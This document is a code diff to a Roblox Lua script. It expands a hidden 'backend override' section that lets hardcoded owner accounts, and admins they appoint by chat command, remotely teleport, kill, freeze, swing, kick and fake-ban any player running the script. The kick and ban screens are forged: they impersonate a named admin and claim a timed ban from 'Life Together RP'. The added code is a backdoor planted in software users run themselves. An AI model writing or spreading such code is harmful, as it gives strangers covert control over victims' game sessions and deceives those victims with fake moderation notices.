@@ -1035,20 +1035,30 @@ end)
 -- BACKEND OVERRIDE SYSTEM
 --==================================================
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local TextChatService = game:GetService("TextChatService")
 
 local plr = Players.LocalPlayer
 local Owners = {"AGKaBaap_YadsanAsuka", "CsXluffy01"}
+local Admins = {}
 local isFrozen = false
+local isSwinging = false
+local swingConn = nil
 
-local function isOwner(name)
-	local lowerName = name:lower()
+local function isOwner(player)
+	if not player then return false end
+	local lowerName = player.Name:lower()
 	for _, ownerName in ipairs(Owners) do
 		if lowerName == ownerName:lower() then
 			return true
 		end
 	end
 	return false
+end
+
+local function isAdmin(player)
+	if not player then return false end
+	return isOwner(player) or Admins[player.UserId] == true
 end
 
 local function matchesTarget(player, targetName, senderPlayer)
@@ -1065,7 +1075,14 @@ local function matchesTarget(player, targetName, senderPlayer)
 		or player.DisplayName:lower():sub(1, #lowerTarget) == lowerTarget
 end
 
-local function setFrozen(state)
+local setFrozen
+local setSwinging
+
+setFrozen = function(state)
+	if state and isSwinging then
+		setSwinging(false)
+	end
+
 	isFrozen = state
 	local char = plr.Character
 	if not char then return end
@@ -1085,11 +1102,70 @@ local function setFrozen(state)
 	end
 end
 
+setSwinging = function(state)
+	if swingConn then
+		swingConn:Disconnect()
+		swingConn = nil
+	end
+
+	if state and isFrozen then
+		setFrozen(false)
+	end
+
+	isSwinging = state
+	local char = plr.Character
+	if not char then return end
+
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	local root = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
+
+	if not state then
+		if root then
+			root.AssemblyLinearVelocity = Vector3.zero
+			root.AssemblyAngularVelocity = Vector3.zero
+		end
+		if hum and not isFrozen then
+			hum.PlatformStand = false
+			hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+		end
+		return
+	end
+
+	if not root then return end
+	if hum then
+		hum.Sit = false
+		hum.PlatformStand = true
+	end
+
+	local pivotCFrame = root.CFrame * CFrame.new(0, 12, 0)
+	local elapsed = 0
+
+	swingConn = RunService.Heartbeat:Connect(function(dt)
+		local currentChar = plr.Character
+		local currentRoot = currentChar and (currentChar:FindFirstChild("HumanoidRootPart") or currentChar.PrimaryPart)
+		if not currentChar or not currentRoot then return end
+
+		elapsed += dt
+		local angle = math.sin(elapsed * 3) * math.rad(65)
+
+		currentRoot.AssemblyLinearVelocity = Vector3.zero
+		currentRoot.AssemblyAngularVelocity = Vector3.zero
+		currentChar:PivotTo(pivotCFrame * CFrame.Angles(angle, 0, 0) * CFrame.new(0, -12, 0))
+	end)
+end
+
 plr.CharacterAdded:Connect(function()
 	if isFrozen then
 		task.wait(0.1)
 		setFrozen(true)
+	elseif isSwinging then
+		task.wait(0.1)
+		setSwinging(true)
 	end
+end)
+
+Players.PlayerRemoving:Connect(function(leavingPlayer)
+	Admins[leavingPlayer.UserId] = nil
 end)
 
 TextChatService.MessageReceived:Connect(function(textResult)
@@ -1097,21 +1173,42 @@ TextChatService.MessageReceived:Connect(function(textResult)
 	if not sender then return end
 
 	local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
-	if not senderPlayer or not isOwner(senderPlayer.Name) then return end
+	if not senderPlayer or not isAdmin(senderPlayer) then return end
 
 	local rawArgs = textResult.Text:split(" ")
 	local cmd = rawArgs[1] and rawArgs[1]:lower()
 	local targetName = rawArgs[2]
 
-	if cmd == ";bring" and targetName then
-		if matchesTarget(plr, targetName, senderPlayer) and plr ~= senderPlayer then
+	local senderIsOwner = isOwner(senderPlayer)
+	local protectedFromSender = isOwner(plr) and not senderIsOwner
+
+	if cmd == ";admin" and targetName then
+		if senderIsOwner then
+			for _, target in ipairs(Players:GetPlayers()) do
+				if matchesTarget(target, targetName, senderPlayer) and not isOwner(target) then
+					Admins[target.UserId] = true
+				end
+			end
+		end
+
+	elseif cmd == ";unadmin" and targetName then
+		if senderIsOwner then
+			for _, target in ipairs(Players:GetPlayers()) do
+				if matchesTarget(target, targetName, senderPlayer) then
+					Admins[target.UserId] = nil
+				end
+			end
+		end
+
+	elseif cmd == ";bring" and targetName then
+		if not protectedFromSender and matchesTarget(plr, targetName, senderPlayer) and plr ~= senderPlayer then
 			if senderPlayer.Character and plr.Character then
 				plr.Character:PivotTo(senderPlayer.Character:GetPivot())
 			end
 		end
 
 	elseif cmd == ";kill" then
-		if not targetName or matchesTarget(plr, targetName, senderPlayer) then
+		if not protectedFromSender and (not targetName or matchesTarget(plr, targetName, senderPlayer)) then
 			local char = plr.Character
 			if char then
 				local hum = char:FindFirstChildOfClass("Humanoid")
@@ -1121,20 +1218,9 @@ TextChatService.MessageReceived:Connect(function(textResult)
 				char:BreakJoints()
 			end
 		end
-			
-	elseif cmd == ";loopkill" and targetName then
-		if matchesTarget(plr, targetName, senderPlayer) then
-			isLoopKilled = true
-			killCharacter()
-		end
 
-	elseif cmd == ";unloopkill" then
-		if not targetName or matchesTarget(plr, targetName, senderPlayer) then
-			isLoopKilled = false
-			end
-	
 	elseif cmd == ";freeze" and targetName then
-		if matchesTarget(plr, targetName, senderPlayer) then
+		if not protectedFromSender and matchesTarget(plr, targetName, senderPlayer) then
 			setFrozen(true)
 		end
 
@@ -1143,24 +1229,38 @@ TextChatService.MessageReceived:Connect(function(textResult)
 			setFrozen(false)
 		end
 
-	elseif cmd == ";kick" and targetName then
+	elseif cmd == ";swing" and targetName then
+		if not protectedFromSender and matchesTarget(plr, targetName, senderPlayer) then
+			setSwinging(true)
+		end
+
+	elseif cmd == ";unswing" and targetName then
 		if matchesTarget(plr, targetName, senderPlayer) then
+			setSwinging(false)
+		end
+
+	elseif cmd == ";kick" and targetName then
+		if not protectedFromSender and matchesTarget(plr, targetName, senderPlayer) then
 			local reason = table.concat(rawArgs, " ", 3)
 			if reason == "" then reason = "No reason provided." end
-			plr:Kick("\n[ EXC KICK ]\nAdmin: " .. senderPlayer.Name .. "\nReason: " .. reason)
+			plr:Kick("\n[ EXC KICK ]\nAdmin: OGBluewolf_712\nReason: " .. reason)
 		end
 
 	elseif cmd == ";ban" and targetName then
-		if matchesTarget(plr, targetName, senderPlayer) then
+		if not protectedFromSender and matchesTarget(plr, targetName, senderPlayer) then
 			local reason = table.concat(rawArgs, " ", 3)
 			if reason == "" then reason = "Banned by Catel Gang" end
-			plr:Kick("\n@@@@@@-@-@-@-@-@-@\nbanned from Life Together RP\nduration 30 mins!\n\nReason: " .. reason:upper() .. "\nAdmin: " .. senderPlayer.Name)
+			plr:Kick("\n@@@@@@-@-@-@-@-@-@\nbanned from Life Together RP\nduration 30 mins!\n\nReason: " .. reason:upper() .. "\nAdmin: OGBluewolf_712")
 		end
 
 	elseif cmd == "!stopall" then
-		if gui then gui:Destroy() end
-		if blur then blur:Destroy() end
+		if senderIsOwner then
+			Admins = {}
+			setSwinging(false)
+			setFrozen(false)
+			if gui then gui:Destroy() end
+			if blur then blur:Destroy() end
+		end
 	end
 end)
-
 
